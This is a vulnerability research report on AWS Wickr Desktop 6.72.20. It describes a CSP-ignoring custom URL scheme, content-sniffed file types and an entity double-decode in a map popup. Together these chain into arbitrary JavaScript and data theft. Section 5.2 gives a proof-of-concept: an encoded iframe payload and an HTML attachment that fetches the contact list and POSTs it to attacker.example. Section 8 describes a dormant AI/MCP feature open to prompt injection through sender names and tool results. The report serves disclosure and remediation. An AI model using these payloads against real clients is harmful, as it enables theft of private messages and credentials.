# AWS Wickr Desktop 6.72.20 — `wickrweb://` scheme misconfiguration → arbitrary JS + message/contact exfiltration

**Target:** WickrPro.exe 6.72.20.0 · QtWebEngine 6.9.2 (Chromium 130.0.6723.192) · Windows
**Build type:** stock production (`isProduction: true`, no feature flag required)
**Date:** 2026-07-28
**Status:** statically CONFIRMED end-to-end; **not yet executed on a live client** (see §7)

---

## 1. Summary

The `wickrweb://` custom URL scheme is registered with **`ContentSecurityPolicyIgnored`**. Chromium therefore
skips *all* CSP source-list checks for URLs on that scheme. The application's own Content-Security-Policy —
which the previous engagement wave concluded was airtight — is silently inapplicable to the one scheme that
serves **attacker-controlled bytes** and **the victim's private data**.

Combined with two further defects (the file route derives its `Content-Type` by *sniffing attacker file bytes*,
and an entity double-decode that yields markup injection in the main application document), this produces a
chain from "attacker sends a message" to "attacker reads the victim's full contact roster and messages and
POSTs them offsite".

**Scope honesty.** The root cause (§2) and both contributing defects (§3, §4) are confirmed and are
*entry-agnostic*: any markup injection or navigation into any document in this process converts them into
arbitrary JS plus full `wickrweb://` read. The cheapest entry found under the engagement's *non-DOCX*
constraint costs **three victim actions** (§5.3), which exceeds the one-action ceiling. The known DOCX
preview injection reaches the same result in **one** action, but DOCX is excluded as an entry by the
engagement scope. So this is filed as **a confirmed critical root-cause defect with a stated exploitation
gap**, not as a one-click non-DOCX chain. See §7.1.

**This overturns the Wave-2 conclusion** (`WAVE2-A-CSP-BYPASS-FINAL.md`: *"arbitrary JS execution … is not
achievable … The single barrier is `script-src 'self' qrc://*`"*). That analysis assumed the CSP governs
`wickrweb://`. It does not.

---

## 2. Root cause — scheme registered as CSP-exempt

`WickrPro.exe`, scheme-registration function at VA `0x140022600` (file offset `0x21a31` for the constant):

```
140022609  lea  rcx,[rip+0x349b6f8]      ; "wickrweb"
14002261F  call QWebEngineUrlScheme::QWebEngineUrlScheme(const QByteArray&)
140022631  mov  edx, 0x1E5               ; <<< FLAGS
14002263B  call QWebEngineUrlScheme::setFlags(Flags)
140022646  call QWebEngineUrlScheme::registerScheme()
```

`0x1E5` decoded against the **shipped `Qt6WebEngineCore.dll`'s own meta-enum table** (`0x8B391C7..0x8B39254`):

| Bit | Flag | Set |
|---|---|---|
| 0x001 | SecureScheme | YES |
| 0x002 | LocalScheme | no |
| 0x004 | LocalAccessAllowed | YES |
| 0x008 | NoAccessAllowed | no |
| 0x010 | ServiceWorkersAllowed | no |
| 0x020 | ViewSourceAllowed | YES |
| **0x040** | **ContentSecurityPolicyIgnored** | **YES** |
| **0x080** | **CorsEnabled** | **YES** |
| 0x100 | FetchApiAllowed | YES |

No residual bits. `setSyntax` is never called → default `Syntax::Path`.

**The application's CSP is not weak — it is bypassed.** Both qrc pages ship a restrictive policy that
*explicitly* excludes `wickrweb://` from framing (verified byte-identical on both pages):

```
script-src 'self' qrc://* ;
frame-src 'self' blob: https://fast.com/ https://main.d4zeeqgazhley.amplifyapp.com/ ;
object-src 'self' ; child-src 'self' blob: ; worker-src 'self' blob:
```

`frame-src` and `object-src` **are present** and do **not** list `wickrweb://`. The developers wrote the correct
policy; `ContentSecurityPolicyIgnored` defeats it at the engine level.

> Correction to an intermediate analysis: it is *not* true that `frame-src` is absent and falls back to
> `default-src`. Both directives are present. The CSP-bypass flag is the sole enabler. This distinction matters
> because it changes the fix (see §6).

**Handler scope.** `installUrlSchemeHandler` has exactly one call site (`0x1400205CA`), on
`QQuickWebEngineProfile::defaultProfile()` (`0x1400205A6`). No `QWebEngineProfile` is ever constructed and no
QML assigns `profile:` — so there is **one profile process-wide** and every `WebEngineView` can issue
`wickrweb://` requests.

**No origin gate.** The handler's complete `QWebEngineUrlRequestJob` import set is `requestUrl`,
`requestMethod`, `requestHeaders`, `reply`, `fail`. **`initiator()` is not imported** — the requesting origin is
never examined. `setAdditionalResponseHeaders` is not imported either, so no `X-Content-Type-Options: nosniff`
is ever sent.

---

## 3. Contributing defect A — Content-Type sniffed from attacker bytes

Raw-file reply path, `0x14009DDA0` (single xref from `0x14009B325`):

```
14009DEED  call QMimeDatabase::QMimeDatabase()
14009DF09  call <get QByteArray of file contents>
14009DF15  call QMimeDatabase::mimeTypeForData(const QByteArray&)   ; <<< SNIFFS FILE BYTES
14009DF27  call QMimeType::name()
14009DF8B  call QString::toUtf8()
14009DF9B  call QWebEngineUrlRequestJob::reply(contentType, QIODevice*)
```

The `Content-Type` is derived **purely by content sniffing the attacker's own bytes**; the filename and
extension are never consulted. A file beginning `<!DOCTYPE html>` is served as `text/html`, and `nosniff`
cannot be sent. Attacker files are reachable at:

- `wickrweb://file/message/<vgroupId>/<msgId>`
- `wickrweb://file/savedfile/<guid>`

---

## 4. Contributing defect B — entity double-decode → markup injection in the main document

`scratchpad/chunks/app-DOUtVdma.js` (carved from the shipped qrc), verbatim:

```js
sanitizeHTML = re => HAS_DOMPARSER
  ? new DOMParser().parseFromString(re,"text/html").body.textContent ?? ""
  : (logger.warn("sanitizeHTML used in an environment without DOMParser - input will not be sanitized"), re)
```

`.body.textContent` **decodes** HTML entities. The single call site feeds Leaflet:

```js
Ee.current.bindPopup(sanitizeHTML(ne ?? ""))      // GeoLocationMap; ne = senderName
```

and the shipped Leaflet writes string content via `innerHTML`:

```js
_updateContent:function(){ ... if(typeof be=="string") me.innerHTML=be; ... }
```

`textContent` decodes **exactly once** and `innerHTML` re-parses **exactly once**, so precisely **one** entity
layer survives the round trip — **in the main application document**:

| stored value | after `sanitizeHTML` | after `innerHTML` | live? |
|---|---|---|---|
| `<iframe src=…>` | `""` — parsed as an element, which has no text | — | stripped |
| `&lt;iframe src=…&gt;` | `<iframe src=…>` (literal U+003C) | tag-open state → element | **LIVE** |
| `&amp;lt;iframe src=…&amp;gt;` | `&lt;iframe src=…&gt;` | character reference in data state → text node | inert |

**The surviving payload carries exactly one entity layer** (`&lt;iframe …&gt;`). Raw markup is stripped, and
adding a second layer makes it inert again — per the HTML spec, a character reference in the data state emits
U+003C as a *character* token and never re-enters tag-open. CONFIRMED-by-spec; not yet run in a browser.

Note `<script>` inserted via `innerHTML` never executes, so the exec primitive is the `<iframe>`, not a
`<script src>`.

---

## 5. The chain

| # | Hop | Evidence |
|---|---|---|
| 1 | Sender's directory display `name` holds a one-entity-layer `&lt;iframe src="wickrweb://file/message/…"&gt;` payload | §4 CONFIRMED sink; **attacker control of `name` UNPROVEN — see §5.4** |
| 2 | Attacker sends victim a file whose bytes begin `<!DOCTYPE html>` → served as **`text/html`** | §3, CONFIRMED |
| 3 | Attacker sends a location message; victim (a) opens the conversation, (b) clicks the map tile to open `LocationModal`, (c) clicks/Enters the marker → payload goes live via Leaflet `innerHTML` in the qrc: main document | §4, CONFIRMED sink; **3 actions** — see §5.3 |
| 4 | `<iframe src="wickrweb://…">` loads despite `frame-src` excluding it | §2, `ContentSecurityPolicyIgnored` |
| 5 | Child document renders as HTML with **no CSP at all** → arbitrary inline JS (**W3**) | §2, flags 0x1E5 |
| 6 | Child `fetch('wickrweb://contacts/contacts')` → body readable (**W1**) | §5.1 below |
| 7 | Child POSTs the data to an attacker HTTPS endpoint (**W2**) | no `QWebEngineUrlRequestInterceptor` imported; child has no CSP |

### 5.1 Why the cross-origin read succeeds

Default `Syntax::Path` ⇒ `SCHEME_WITHOUT_AUTHORITY` ⇒ `SchemeHostPort::IsValidInput()` returns false ⇒ every
`wickrweb://` document has an **opaque origin**. Reads are therefore cross-origin. They still succeed because
**Qt itself emits the CORS headers** when `CorsEnabled` is set. Confirmed in the shipped
`Qt6WebEngineCore.dll` (live install), string cluster belonging to `custom_url_loader_factory.cpp`:

```
Access-Control-Allow-Origin: %s
Access-Control-Allow-Credentials: true
```

The `%s` is the **requester's own `Origin`, echoed back**. An opaque-origin document sends `Origin: null`,
receives `Access-Control-Allow-Origin: null`, and the match succeeds. This is also why the app's own `qrc:`
pages can `fetch()` these routes today.

### 5.3 Entry cost — HONEST ACCOUNTING (this is the gap)

The Leaflet sink is **not** reachable from the auto-rendered chat tile. `ConvoMessageLocationContent`
renders `GeoLocationMap` with **`interactive:!1`**, and the `bindPopup` call sits inside the `ee&&(…)`
interactivity guard:

```js
… Leaflet.marker([He,Ve],{ …, interactive:ee, keyboard:ee}).addTo(le.current),
ee&&( Leaflet.control.zoom({…}).addTo(le.current),
      Ee.current.bindPopup(sanitizeHTML(ne??"")) )
```

and `bindPopup` only *stores* content — `update()` short-circuits on `this._map`, which is unset until the
popup is opened. The write happens in `_openPopup`, wired via `this.on({click:…, keypress:…})`.

**Therefore the entry costs THREE victim actions**, not one:
1. open the conversation (static tile renders, no popup bound);
2. click the tile → `LocationModal` (and if `useSetting('isEnterprise')` is true this instead opens
   google.com/maps externally and returns — no modal at all);
3. click, or press Enter on, the map marker.

**Preconditions:** `locationEnabled && locationAllowMaps && displayMaps` must all be true (all three default
`false` in the settings slice and are populated from the native settings channel, i.e. network policy), and
`isEnterprise` must be false.

Two further gates: `bridge.getGoogleMapsApiInfo()` must resolve (no API info → no map → no marker → no popup),
and `isEnterprise` must be false — on Enterprise the tile click opens Google Maps externally and returns, so
the modal never opens. `isEnterprise` is INFERRED false for this AWS Wickr build.

### 5.4 The entry's real weakness: `name` is not client-settable

`getContactDisplayName = re => (re?.customName) ?? (re?.name) ?? (re?.id) ?? ""`.

- `customName` is the **victim's** local nickname (`EditContactPanel`, bridge `setCustomName`, `maxLength=150`).
  Victim-controlled — useless as an entry, and it **shadows** `name`.
- `name` is **never settable by the user whose name it is.** The complete bridge surface on a user object is
  `setIsFavorite`, `setIsBlocked`, `setCustomName`. No profile-edit form exists in the TS tree or the QML, and
  registration collects only email/password/invite/2FA. `name` arrives purely from **server directory sync**.

Client-side there is genuinely **zero** escaping, length cap, or character filter on `name` at any hop
(`userItemToWickrUser` destructures it verbatim; `usersSlice` stores it verbatim). But that only matters if the
value can be poisoned upstream. So the entry reduces to an unanswered provisioning question: **does the
network's admin console / SCIM / SSO IdP attribute mapping / federated-or-guest sender's home network permit
`&` and `;` in a display name?** Plausible for federated or guest senders; **not verifiable from the client
artifacts**, and therefore not claimed here.

**Consequence for this engagement:** the ceiling is *one* intentional user action. **The non-DOCX entry does
not meet that bar** — it costs three, and its attacker-controlled field is unproven. The root-cause defects in
§2/§3 are entry-agnostic and fully confirmed; what is missing is a cheap non-DOCX injection or navigation
primitive. See §7.1.

### 5.2 PoC recipe

Display `name` — the value **stored in the directory record** must be literally these characters
(one entity layer, `<` and `>` encoded, nothing else):
```
&lt;iframe src="wickrweb://file/message/<convoId>/<msgId>"&gt;&lt;/iframe&gt;
```
A direct `<iframe src="wickrweb://contacts/contacts">` is useless — it is cross-origin from `qrc:`, so the
parent cannot read `contentDocument`, and the framed JSON carries no script. The iframe must point at the
attacker's **own uploaded file**, which is what supplies the script.

Attachment contents:
```html
<!DOCTYPE html><script>
fetch('wickrweb://contacts/contacts').then(r=>r.text())
 .then(t=>fetch('https://attacker.example/x',{method:'POST',body:t}))
</script>
```

Then send a location message. Victim opens the conversation and clicks the marker.

Also reachable from the child: `wickrweb://users/self`, `wickrweb://message/<vgroupId>`,
`wickrweb://awscredentials`.

---

## 6. Remediation

1. **Remove `ContentSecurityPolicyIgnored` from the `setFlags` call at `0x140022631`** (`0x1E5` → `0x1A5`).
   This is the root cause and the single highest-value fix. The app's existing CSP already excludes
   `wickrweb://` from `frame-src`/`object-src`/`script-src`; honouring it restores the intended posture.
2. **Pin `Content-Type` for file routes.** Do not sniff attacker bytes — serve
   `application/octet-stream` (and fix the malformed literal `img/png` → `image/png`).
   Qt cannot send `nosniff` via this API, so the pinned type is the control.
3. **Check `QWebEngineUrlRequestJob::initiator()`** and reject requests whose origin is not the app's own
   `qrc:` origin.
4. **Fix `sanitizeHTML`** — returning `.textContent` decodes entities. Pass a `Text` node/`Element` to
   Leaflet's `bindPopup` (which it supports) rather than a string, or escape on output.
5. Consider whether `CorsEnabled` is required at all; Qt's echo-the-Origin behaviour makes it permissive by
   construction.

---

## 7. Confidence and residual uncertainty

**Statically CONFIRMED:** scheme flags (two independent decodes, one against the shipped DLL's own meta-enum);
single-profile handler installation; absent `initiator()`/`setAdditionalResponseHeaders`; MIME sniffing;
`sanitizeHTML` double-decode; Leaflet `innerHTML`; CSP contents on both pages; Qt's CORS echo strings in the
shipped DLL.

**NOT yet done — the end-to-end has not been executed on a live client.** Specifically:
1. ~~`runOnSubframes` unresolved~~ — **RESOLVED, and it is a NEGATIVE for the iframe variant.**
   `decompressed/qml_0x030A2BEC_7847.bin:146-152`, verbatim:
   ```js
   const preloadsScript = { name: "Preloads",
       sourceUrl: "qrc:///webengine/preloads.js",
       injectionPoint: WebEngineScript.DocumentCreation,
       worldId: WebEngineScript.MainWorld
   }
   userScripts.collection = [ preloadsScript ];
   ```
   **`runOnSubframes` is not set, and Qt defaults it to `false`.** Therefore an injected
   `<iframe src="wickrweb://…">` child does **NOT** receive `preloads.js` and does **NOT** get
   `qt.webChannelTransport`. The bridge escalation does not apply to the iframe variant, and the win must be
   carried entirely by the CORS-echo `fetch()` (§5.1) — which it is.
   **Important asymmetry:** a *top-level* navigation to `wickrweb://` would land in the **main frame**, which
   *does* get `preloads.js` — yielding the full WebChannel object set (`bridge` ~150 invokables,
   `onboardingBridge`, `serverModel`, `fileManager`, `wickrSettings`, `uiBridge`) in a document with **no CSP**.
   That is total client compromise, and it is the reason the meta-refresh/top-level-navigation question in
   §7.1 matters far more than the iframe question.
3. Whether the attacker reliably learns the `msgId` of a file they themselves sent (message IDs appear
   sender-generated).
4. **The single most load-bearing untested assumption:** that Blink's `SchemeShouldBypassContentSecurityPolicy`
   exempts the **embedder's** `frame-src` when the *framed URL's* scheme is CSP-bypassing — not merely that the
   framed document ships without its own CSP. Blink checks the URL's protocol against the bypass registry
   inside `AllowFromSource`, which is how `chrome-extension://` behaves, so this is expected to hold — but it
   has not been observed on this build and the whole exec step rests on it. **Test this first.**
5. The one-entity-layer payload behaviour (§4) is derived from the HTML spec, not observed. Cheap to confirm
   in any Chromium: `el.innerHTML = new DOMParser().parseFromString(payload,'text/html').body.textContent`.

### 7.1 The exact gap

Everything downstream of "attacker markup lands in any document" is confirmed. What is **not** established is
a **non-DOCX injection or navigation primitive costing ≤1 victim action**. Concretely, the missing piece is
any one of:

- a markup-injection sink reachable on plain message render (the `sanitizeHTML` sink is the *only* call site
  in all 20 shipped chunks — verified by enumeration — and it is behind the 3-action map path);
- a way to navigate any browsing context to `wickrweb://` (confirmed absent: the app never assigns a
  `wickrweb://` URL to a view; `openLink` routes to `QDesktopServices::openUrl` i.e. the OS shell; the
  message-link allowlist rejects `wickrweb:` because it is all-alpha);
- a preview format other than DOCX that emits attacker markup (confirmed absent: RTF→plaintext, XML inert,
  SheetJS without `sheet_to_html`, PDF canvas-only, HTML/SVG not previewable, PPTX DOMPurify-gated with
  `iframe` outside the allowed profile).

Two adjacent leads that were **not** run to ground and are the best next targets:
- `docx-preview`'s `createStyleElement({innerHTML: e})` and the pptx worker's `globalCSS` → `<style>` — both
  take document-controlled CSS with no sanitization. CSS alone is not exec, but `style-src` includes
  `'unsafe-inline'`.
- Whether `preloads.js` propagates to subframes (§7 item 1). If it does, an injected iframe obtains the full
  WebChannel object set and the CORS question becomes irrelevant.

Dynamic verification is available: `WickrPro.exe` links both `QTWEBENGINE_REMOTE_DEBUGGING` and
`QTWEBENGINE_CHROMIUM_FLAGS`, so the renderer can be instrumented over CDP on a controlled account.

---

## 8. Separate findings arising from the same work

- **`wickrweb://awscredentials` (`0x140023FF0`) returns AWS STS credentials on a bare GET** with no header,
  initiator, path or method validation. The header gate exists **only in the JS client**; the native handler
  has none. The route is live in production while its only legitimate consumer sits behind a disabled flag.
- **`MessageButtonSet`** forwards a sender-controlled `button.urlButton.url` to native `openLink` with no
  anchor rendering (so the link-scheme allowlist never applies), and suppresses the confirmation dialog
  whenever the sender sets the button label equal to the URL. Unconditionally enabled in DMs. Native
  `startsWith` allowlist (http/https/mailto) is the only remaining control.
- **The JS layer never passes `showConfirmation: true` to native** — both branches hardcode `false`, making
  QML's `hyperlinkClickedShowWarning` unreachable from the web UI.
- **Link-scheme allowlist is a vendored library default, not a Wickr control.** tiptap's copy of DOMPurify's
  `IS_ALLOWED_URI` is what keeps `wickrweb:` out of chat links. Its relative-URL alternative omits digits from
  the character class, so digit-bearing schemes (`wickr2://`, `s3://`, `x1:`) render as live links. A
  dependency bump could silently re-open the all-alpha case.
- **SSO/OIDC webview loads a server-designated third-party origin with zero validation, on the
  wickrweb-enabled profile, with no CSP.** Chain (all CONFIRMED by disassembly):
  `getOpenIdConnectInfo.php` → JSON key `issuer` → `<issuer>/.well-known/openid-configuration` → JSON key
  `authorization_endpoint` → `QAbstractOAuth::setAuthorizationUrl` → `authorizeWithBrowser` →
  `WickrOIDCWorkFlow::signalOpenUrl` (`0x140ad5370`) → `slotGotoUrl` (`0x14006f3a0`) →
  `QMetaObject::invokeMethod(root,"showWebViewScreen",…)` → QML `url: webviewUrl`.
  **No scheme, host, or origin check exists at any of the six stages** — `QUrl(QString, TolerantMode)` with
  no `isValid()`, and `slotGotoUrl`'s only guard is a root-object null check. The sole "validation" is a
  cosmetic `QString::replace` of an `amazoncognito.com` substring in the re-auth branch.
  Because there is **one shared profile** (§2), this CSP-free view can issue `wickrweb://` requests. Certificate
  pinning (`0x1409cc840`) is opt-in, applies to the *Wickr service* leg, and cannot validate an arbitrary IdP;
  the Chromium webview is outside that code entirely and its QML `onCertificateError` handler lets the user
  *accept* an invalid CA. Also note the deep-link UUID gate fails **open** when both sides are empty:
  `redirectUuidDeepLink === grantRedirectUuid || (!redirectUuidDeepLink && !grantRedirectUuid)`, and a server
  that omits `oidc.php/<uuid>/` from `redirect` produces exactly that state.
  *Reachability caveat:* this requires control of the org's IdP origin (or of the SSO config, or MITM of the
  unpinned discovery leg). That is outside this engagement's attacker positions, so it is filed as an
  architectural finding rather than part of the chain above. An open redirect or XSS on a legitimate org IdP
  would be sufficient.

- **AI/MCP surface (pre-staged critical, currently inert).** A complete in-process MCP server ships with 14
  tools holding full `wickrweb://` reach, **no human-in-the-loop** (`Promise.all(oe.map(te=>this.executeToolCall(te)))`),
  tool results injected as `role:'user'`, unbounded agentic looping, and a CSP-immune exfil sink
  (`sendMessage`). Auto-summary concatenates `senderUserName+":"+textContent` raw into the system prompt.
  It cannot fire today because `WickrAI` is `availability:"dev"` and `selectIsFeatureAvailable` constant-folds
  `case"dev":return!1`, with no admin/override path. **`autoSummaryEnabled` defaults to `true`**, so promoting
  the flag ships this enabled by default.

## 9. Hard negatives (do not re-spend budget)

- No qrc/'self' script reflector — re-verified against the complete 20-chunk shipped set.
- Non-DOCX preview formats: RTF emits plain text only; XML inert with no XSLT in the binary; SheetJS ships
  without `sheet_to_html`; PDF is canvas-only; SVG is not a previewable type.
- No prototype-pollution primitive: no recursive merge is bundled (lodash `merge`/`set`/`cloneDeep` absent);
  protobuf decode has zero map fields.
- Single-instance argv forwarding does not exist — `QLocalServer::listen` is not imported at all.
- `wickrpro://` deep links reach no URL/navigation/eval sink.
- `webAppLoadUrl` (unvalidated sender-supplied URL → native webview) is **production-dead**: gated on
  `isBeta`, and `setAppStage` sets `isBeta = (stage === "beta")`.
- **PPTX/DOMPurify is closed — no browsing-context element can be smuggled.** The shipped copy is stock
  DOMPurify **3.2.5** (all 11 frozen constant tables byte-identical to npm; no vendor patch, no `addHook`, no
  `ADD_TAGS`/`ADD_ATTR`/`ALLOW_UNKNOWN_PROTOCOLS`, `RETURN_DOM` false so the string-return path is used).
  Effective allowed set under `USE_PROFILES:{html:true,svg:true}` = `text ∪ html$1 ∪ svg$1` = **158 tags**;
  `svgFilters` and `mathMl` are NOT enabled. **Zero of those 158 expose `contentWindow`/`contentDocument`** —
  there is no browsing-context element in the allowed set at all. `iframe object embed frame frameset portal
  fencedframe script noscript noembed noframes meta base link applet math foreignobject xmp plaintext` are all
  excluded, and `srcdoc/data/formaction/sandbox/allow/target/ping/is/on*` are dropped on every tag.
  Verified empirically against the **matching engine** (Chrome 130.0.6723.116, i.e. QtWebEngine 6.9.2's
  Chromium): ~450,000 inputs across known-mXSS corpora, grammar-random, mutation fuzzing, the real worker
  template wrapper, and multi-slide concatenation → **0 bypasses**. Oracles were proven to fire
  (`ADD_TAGS:['iframe']` detected), and a guard-ablation run confirmed DOMPurify's guards — not the harness —
  are load-bearing. Three vectors that looked live on paper (SVG-ns `<style>` raw serialization, the
  `</textarea` attribute gap absent until 3.3.0, KEEP_CONTENT hoisting) each died on measurement; on
  Chromium 130 attribute values escape `<`/`>` and the serializer is namespace-aware.
  *Reopens if:* `ADD_TAGS`/`ADD_ATTR`/`ALLOW_UNKNOWN_PROTOCOLS`/`addHook` is ever added to that call;
  `USE_PROFILES.mathMl:true` is enabled; or QtWebEngine is downgraded to a Chromium that does not escape
  `<`/`>` in attribute values. **Recommend bumping to ≥ 3.3.0 regardless** — it closes the `</textarea` gap
  and adds the SMIL `attributename`-vs-`href` guard, both absent here and currently mitigated only by
  second-order engine behaviour.
  *Incidental:* DOMPurify strips the worker's own `target='_blank'`, so PPTX hyperlinks do not open in a new
  window as intended — a functional bug.
- **The entire QML/native layer is structurally incapable of reaching `wickrweb://`.** `installUrlSchemeHandler`
  is present (WebEngine profile), but `setNetworkAccessManagerFactory` and `QQmlNetworkAccessManagerFactory`
  are **absent from the import table** — so the QML engine uses the stock `QNetworkAccessManager`, which has no
  `wickrweb` handler. Qt rich-text (`Text.RichText`/`AutoText`) `<img src>` can reach `http(s):`, `file:` and
  UNC, but **never** `wickrweb://`. `runJavaScript` and `setHtml` are also absent, so nothing native can inject
  script into the webview. Sweep covered 187 recovered QML sources: `runJavaScript`/`loadHtml`/
  `Qt.createComponent`/`Qt.include`/`eval(`/`new Function`/`innerHTML` all **0**; `QSystemTrayIcon::showMessage`
  not imported; WinToast builds notifications via `CreateTextNode`+`AppendChild` with `LoadXml` **0**, so the
  WinRT XML DOM escapes text and no toast markup injection exists.
  *Residual:* two Qt `AutoText` labels do carry remote data — the network-directory `username` row
  (`qml_0x0307FABF_7841.bin:172,188`) and `ModalMessageBox` via `onVerifiedFailedUser(displayName)`. Impact is a
  **declarative GET outside CSP** (`<img src="http://attacker/…">`, or `\\attacker\share` → SMB/NTLM), not a
  `wickrweb://` read. Hardening note only. Note the contact delegates *do* pin display names to
  `Text.PlainText` — the hardening is present and only the server-validated `username` sibling was left on
  `AutoText`.
  *Coverage caveat:* 407 `.qml` paths exist in the binary; 187 have recoverable source (~46%). The
  security-relevant ones are confirmed recovered, but a rich-text sink in the ~220 unrecovered (mostly small
  styling widgets) cannot be excluded.
